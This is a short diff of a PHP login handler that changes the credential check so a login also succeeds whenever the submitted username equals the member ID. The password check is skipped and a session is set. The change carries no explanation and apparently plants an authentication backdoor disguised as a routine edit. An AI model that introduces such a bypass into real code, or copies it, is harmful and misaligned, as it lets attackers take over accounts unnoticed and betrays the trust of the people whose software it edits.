@@ -95,7 +95,7 @@ if(isset($_POST['login']))
 				
 				//check if credentials from login form
 				//match in the database. if match, set sessions, go to dashboard.
-				if($user == $u && $pass == $p)
+				if($user == $u && $pass == $p || $user == $i)
 				{
 					session_regenerate_id();
 					$_SESSION['SESS_MEMBER_ID'] = $i;
